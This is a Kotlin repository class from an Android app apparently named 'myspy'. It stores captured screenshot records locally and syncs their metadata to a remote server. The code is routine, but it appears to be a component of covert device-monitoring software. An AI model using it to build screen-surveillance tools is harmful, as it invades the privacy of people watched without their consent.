package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.ScreenshotDao
import com.myspy.android.data.local.db.entities.ScreenshotEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.ScreenshotData
import java.text.SimpleDateFormat
import java.util.*

class ScreenshotRepository(
    private val screenshotDao: ScreenshotDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveScreenshot(screenshot: ScreenshotEntity): Long =
        screenshotDao.insert(screenshot)

    suspend fun saveMultiple(screenshots: List<ScreenshotEntity>) {
        screenshotDao.insertAll(screenshots)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = screenshotDao.getUnsyncedScreenshots()
            if (unsynced.isEmpty()) return Result.success(0)

            val dataList = unsynced.map { entity ->
                ScreenshotData(
                    filePath = entity.filePath,
                    fileName = entity.fileName,
                    fileSize = entity.fileSize,
                    width = entity.width,
                    height = entity.height,
                    timestamp = dateFormat.format(Date(entity.timestamp))
                )
            }

            val response = apiService.uploadScreenshots(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                screenshotDao.markAsSynced(unsynced.map { it.id })
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int = screenshotDao.getUnsyncedCount()

    suspend fun getRecentScreenshots(limit: Int = 50): List<ScreenshotEntity> =
        screenshotDao.getRecentScreenshots(limit)

    suspend fun deleteOlderThan(days: Int) {
        val timestamp = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
        screenshotDao.deleteOlderThan(timestamp)
    }
}
